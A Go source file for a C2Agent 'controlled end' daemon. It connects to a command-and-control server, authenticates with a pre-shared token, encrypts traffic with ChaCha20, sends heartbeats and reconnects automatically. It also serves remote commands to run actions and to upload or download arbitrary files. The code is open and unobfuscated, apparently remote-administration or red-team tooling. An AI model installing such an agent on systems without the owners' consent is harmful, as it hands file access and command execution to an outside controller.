// Command c2agent_remote is a self-contained Go controlled end for C2Agent.
// It speaks the same native protocol (16B header + TLV + ChaCha20) as
// remote-c / remote-py and the C2, with no third-party dependencies.
//
// Headless daemon: dial the C2, register (challenge-response), send
// heartbeats, serve action/file-transfer commands, and reconnect with
// exponential backoff.
package main

import (
	"crypto/rand"
	"crypto/subtle"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"time"
)

type options struct {
	configPath       string
	c2Address        string
	agentID          string
	authToken        string
	heartbeat        int
	cmdTimeout       int
	reconnectInitial float64
	reconnectMax     float64
}

func (o *options) init() {
	o.heartbeat = 30
	o.cmdTimeout = 60
	o.reconnectInitial = 1
	o.reconnectMax = 60
}

type fileConfig struct {
	C2Address        string  `json:"c2_address"`
	AgentID          string  `json:"agent_id"`
	AuthToken        string  `json:"auth_token"`
	Heartbeat        int     `json:"heartbeat_interval_sec"`
	CmdTimeout       int     `json:"cmd_timeout"`
	ReconnectInitial float64 `json:"reconnect_initial_sec"`
	ReconnectMax     float64 `json:"reconnect_max_sec"`
}

func loadConfigFile(path string, o *options) {
	data, err := os.ReadFile(path)
	if err != nil {
		log.Printf("warning: cannot read config file %s: %v", path, err)
		return
	}
	var fc fileConfig
	if err := json.Unmarshal(data, &fc); err != nil {
		log.Printf("warning: cannot parse config file %s: %v", path, err)
		return
	}
	if fc.C2Address != "" {
		o.c2Address = fc.C2Address
	}
	if fc.AgentID != "" {
		o.agentID = fc.AgentID
	}
	if fc.AuthToken != "" {
		o.authToken = fc.AuthToken
	}
	if fc.Heartbeat > 0 {
		o.heartbeat = fc.Heartbeat
	}
	if fc.CmdTimeout > 0 {
		o.cmdTimeout = fc.CmdTimeout
	}
	if fc.ReconnectInitial > 0 {
		o.reconnectInitial = fc.ReconnectInitial
	}
	if fc.ReconnectMax > 0 {
		o.reconnectMax = fc.ReconnectMax
	}
}

func main() {
	log.SetPrefix("[c2agent] ")
	log.SetFlags(log.LstdFlags | log.Lmsgprefix)

	var o options
	o.init()

	// First pass: load the config file so its values become flag defaults.
	for i := 1; i+1 < len(os.Args); i++ {
		if os.Args[i] == "--config" || os.Args[i] == "-config" {
			o.configPath = os.Args[i+1]
			loadConfigFile(o.configPath, &o)
		}
	}

	fs := flag.NewFlagSet("c2agent_remote", flag.ExitOnError)
	fs.StringVar(&o.configPath, "config", o.configPath, "optional JSON config file")
	fs.StringVar(&o.c2Address, "c2-address", o.c2Address, "C2 host:port (required)")
	fs.StringVar(&o.agentID, "agent-id", o.agentID, "unique agent id (required)")
	fs.StringVar(&o.authToken, "auth-token", o.authToken, "pre-shared auth token (required)")
	fs.IntVar(&o.heartbeat, "heartbeat-interval", o.heartbeat, "heartbeat interval seconds")
	fs.IntVar(&o.cmdTimeout, "cmd-timeout", o.cmdTimeout, "command execution timeout seconds")
	fs.Float64Var(&o.reconnectInitial, "reconnect-initial", o.reconnectInitial, "initial reconnect delay seconds")
	fs.Float64Var(&o.reconnectMax, "reconnect-max", o.reconnectMax, "max reconnect delay seconds")
	_ = fs.Parse(os.Args[1:])

	if o.c2Address == "" || o.agentID == "" || o.authToken == "" {
		log.Fatal("missing required config: c2_address, agent_id, auth_token (via flags or --config)")
	}
	if o.heartbeat < 1 {
		o.heartbeat = 1
	}
	if o.cmdTimeout < 1 {
		o.cmdTimeout = 1
	}

	log.Printf("agent '%s' starting; C2=%s (heartbeat=%ds, cmd_timeout=%ds)",
		o.agentID, o.c2Address, o.heartbeat, o.cmdTimeout)
	os.Exit(run(&o))
}

func run(o *options) int {
	delay := o.reconnectInitial
	if delay < 1 {
		delay = 1
	}
	for {
		conn, err := net.DialTimeout("tcp", o.c2Address, 15*time.Second)
		if err != nil {
			log.Printf("connect to %s failed: %v; retry in %.0fs", o.c2Address, err, delay)
			time.Sleep(seconds(delay))
			delay = nextDelay(delay, o.reconnectMax)
			continue
		}
		log.Printf("connected to %s", o.c2Address)

		enc, pr, err := handshake(conn, o)
		if err != nil {
			log.Printf("registration handshake failed: %v", err)
			_ = conn.Close()
			time.Sleep(seconds(delay))
			delay = nextDelay(delay, o.reconnectMax)
			continue
		}
		log.Printf("registered as %s", o.agentID)

		// Successful handshake: reset the reconnect backoff.
		delay = o.reconnectInitial
		if delay < 1 {
			delay = 1
		}

		shutdown := serve(enc, pr, o)
		_ = enc.Close()
		if shutdown {
			log.Printf("shutdown received, exiting")
			return 0
		}
		log.Printf("connection closed; retry in %.0fs", delay)
		time.Sleep(seconds(delay))
		delay = nextDelay(delay, o.reconnectMax)
	}
}

func seconds(d float64) time.Duration { return time.Duration(d * float64(time.Second)) }

func nextDelay(d, max float64) float64 {
	nd := d * 2
	if nd > max {
		nd = max
	}
	return nd
}

// handshake performs the challenge-response registration and returns the
// encrypted connection plus the packet reader (which may hold decrypted
// leftovers for the serve loop).
func handshake(conn net.Conn, o *options) (*encryptedConn, *packetReader, error) {
	pr := &packetReader{}
	nonce := randomHex(16)
	if _, err := conn.Write(buildRequest(1, cmdRegister, []string{nonce})); err != nil {
		return nil, nil, err
	}

	deadline := time.Now().Add(30 * time.Second)
	buf := make([]byte, 4096)
	var expected string
	for {
		pkt, err := pr.next()
		if err != nil {
			return nil, nil, err
		}
		if pkt != nil {
			if pkt.cmd != cmdRegisterResponse {
				return nil, nil, fmt.Errorf("expected register_response, got %#x", pkt.cmd)
			}
			expected = string(pkt.body)
			break
		}
		_ = conn.SetReadDeadline(deadline)
		n, rerr := conn.Read(buf)
		if n > 0 {
			pr.feed(buf[:n])
		}
		if rerr != nil {
			return nil, nil, rerr
		}
		if time.Now().After(deadline) {
			return nil, nil, fmt.Errorf("register_response timeout")
		}
	}
	_ = conn.SetReadDeadline(time.Time{})

	local := sha256Hex(nonce + o.authToken)
	if subtle.ConstantTimeCompare([]byte(local), []byte(expected)) != 1 {
		return nil, nil, fmt.Errorf("auth verification failed (token mismatch)")
	}

	key := deriveKey(o.authToken)
	tx := newChaCha20(key[:], nonceAgentToC2, 0)
	rx := newChaCha20(key[:], nonceC2ToAgent, 0)
	enc := newEncryptedConn(conn, tx, rx)

	host, err := os.Hostname()
	if err != nil || host == "" {
		host = "unknown"
	}
	confirm := buildRequest(2, cmdRegisterConfirm, []string{o.agentID, host, detectOS()})
	if _, err := enc.Write(confirm); err != nil {
		return nil, nil, err
	}
	return enc, pr, nil
}

type dispatchResult int

const (
	cont dispatchResult = iota
	stopDisconnect
	stopShutdown
)

func serve(conn net.Conn, pr *packetReader, o *options) bool {
	nextReq := uint64(3)
	lastHB := time.Now()
	hbInterval := time.Duration(o.heartbeat) * time.Second
	buf := make([]byte, 4096)

	for {
		pkt, err := pr.next()
		if err != nil {
			return false
		}
		if pkt != nil {
			switch dispatch(conn, pr, pkt, o) {
			case stopShutdown:
				return true
			case stopDisconnect:
				return false
			}
			// Send a due heartbeat even under a steady packet flow, so the C2
			// watchdog cannot time us out while commands keep arriving.
			if time.Since(lastHB) >= hbInterval {
				if err := sendHeartbeat(conn, nextReq); err != nil {
					return false
				}
				nextReq++
				lastHB = time.Now()
			}
			continue
		}

		wait := hbInterval - time.Since(lastHB)
		if wait <= 0 {
			if err := sendHeartbeat(conn, nextReq); err != nil {
				return false
			}
			nextReq++
			lastHB = time.Now()
			continue
		}
		_ = conn.SetReadDeadline(time.Now().Add(wait))
		n, rerr := conn.Read(buf)
		if n > 0 {
			pr.feed(buf[:n])
		}
		if rerr != nil {
			if ne, ok := rerr.(net.Error); ok && ne.Timeout() {
				if err := sendHeartbeat(conn, nextReq); err != nil {
					return false
				}
				nextReq++
				lastHB = time.Now()
				continue
			}
			return false
		}
	}
}

func dispatch(conn net.Conn, pr *packetReader, pkt *packet, o *options) dispatchResult {
	switch pkt.cmd {
	case cmdHeartbeatAck, cmdRegisterResponse:
		return cont
	case cmdHeartbeat:
		_ = send(conn, buildResponse(pkt.reqID, cmdHeartbeatAck, string(pkt.body)))
		return cont
	case cmdDisconnect:
		return stopDisconnect
	case cmdShutdown:
		_ = send(conn, buildResponse(pkt.reqID, cmdShutdown, "ok"))
		return stopShutdown
	case cmdUpload:
		handleUpload(conn, pr, pkt, o)
		return cont
	case cmdDownload:
		handleDownload(conn, pkt)
		return cont
	}

	if isActionCmd(pkt.cmd) {
		params, err := decodeTLV(pkt.body)
		if err != nil {
			_ = send(conn, buildResponse(pkt.reqID, pkt.cmd, "Error: bad TLV"))
			return cont
		}
		result := runAction(pkt.cmd, params, time.Duration(o.cmdTimeout)*time.Second)
		_ = send(conn, buildResponse(pkt.reqID, pkt.cmd, result))
		return cont
	}
	_ = send(conn, buildResponse(pkt.reqID, pkt.cmd, "Error: Unknown cmd"))
	return cont
}

// drainUpload consumes a failed upload's remaining data packets so the serve
// loop does not misparse them as commands.
func drainUpload(conn net.Conn, pr *packetReader, reqID uint64) {
	for {
		p, err := readPacket(conn, pr, 30*time.Second)
		if err != nil {
			return
		}
		if p.cmd >= 0x80 {
			continue
		}
		if p.reqID != reqID || p.cmd == endFlagLast {
			return
		}
		if p.cmd != endFlagContinue {
			return
		}
	}
}

func handleUpload(conn net.Conn, pr *packetReader, pkt *packet, o *options) {
	params, err := decodeTLV(pkt.body)
	if err != nil || len(params) < 1 {
		_ = send(conn, buildResponse(pkt.reqID, cmdUpload, "Error: missing dest_path"))
		return
	}
	dest := params[0]
	if dir := filepath.Dir(dest); dir != "" && dir != "." {
		_ = os.MkdirAll(dir, 0o755)
	}
	f, err := os.Create(dest)
	if err != nil {
		drainUpload(conn, pr, pkt.reqID)
		_ = send(conn, buildResponse(pkt.reqID, cmdUpload, "Error: cannot create file: "+err.Error()))
		return
	}
	total := 0
	ok := false
	for {
		p, err := readPacket(conn, pr, 30*time.Second)
		if err != nil {
			break
		}
		if p.cmd >= 0x80 { // interleaved control packet (heartbeat ack)
			continue
		}
		if p.reqID != pkt.reqID {
			break
		}
		if len(p.body) > 0 {
			if _, werr := f.Write(p.body); werr != nil {
				break
			}
			total += len(p.body)
		}
		if p.cmd == endFlagLast {
			ok = true
			break
		}
		if p.cmd != endFlagContinue {
			break
		}
	}
	_ = f.Close()
	if ok {
		_ = send(conn, buildResponse(pkt.reqID, cmdUpload,
			fmt.Sprintf("Successfully uploaded: %s (%d bytes)", dest, total)))
	} else {
		_ = os.Remove(dest)
		drainUpload(conn, pr, pkt.reqID)
		_ = send(conn, buildResponse(pkt.reqID, cmdUpload, "Error: upload failed"))
	}
}

func handleDownload(conn net.Conn, pkt *packet) {
	params, err := decodeTLV(pkt.body)
	if err != nil || len(params) < 1 {
		_ = send(conn, buildResponse(pkt.reqID, cmdDownload, "Error: missing src_path"))
		return
	}
	src := params[0]
	info, err := os.Stat(src)
	if err != nil {
		_ = send(conn, buildResponse(pkt.reqID, cmdDownload, "Error: source not found: "+src))
		return
	}
	if info.IsDir() {
		_ = send(conn, buildResponse(pkt.reqID, cmdDownload, "Error: source is a directory: "+src))
		return
	}
	f, err := os.Open(src)
	if err != nil {
		_ = send(conn, buildResponse(pkt.reqID, cmdDownload, "Error: cannot open source: "+err.Error()))
		return
	}
	defer f.Close()

	buf := make([]byte, dataChunkSize)
	for {
		n, rerr := f.Read(buf)
		if n > 0 {
			flag := uint8(endFlagContinue)
			if n < dataChunkSize {
				flag = endFlagLast
			}
			if err := send(conn, buildDataPacket(pkt.reqID, flag, buf[:n])); err != nil {
				return
			}
			if flag == endFlagLast {
				return
			}
		}
		if rerr == io.EOF {
			_ = send(conn, buildDataPacket(pkt.reqID, endFlagLast, nil))
			return
		}
		if rerr != nil {
			return
		}
	}
}

func send(conn net.Conn, pkt []byte) error {
	_ = conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
	_, err := conn.Write(pkt)
	return err
}

func sendHeartbeat(conn net.Conn, reqID uint64) error {
	return send(conn, buildRequest(reqID, cmdHeartbeat, []string{fmt.Sprintf("%d", time.Now().Unix())}))
}

func detectOS() string {
	switch runtime.GOOS {
	case "windows":
		return "Windows"
	case "darwin":
		return "macOS"
	default:
		return "Linux"
	}
}

func randomHex(n int) string {
	buf := make([]byte, n)
	if _, err := rand.Read(buf); err != nil {
		seed := time.Now().UnixNano()
		for i := range buf {
			buf[i] = byte(seed >> (uint(i%8) * 8))
		}
	}
	return hex.EncodeToString(buf)
}
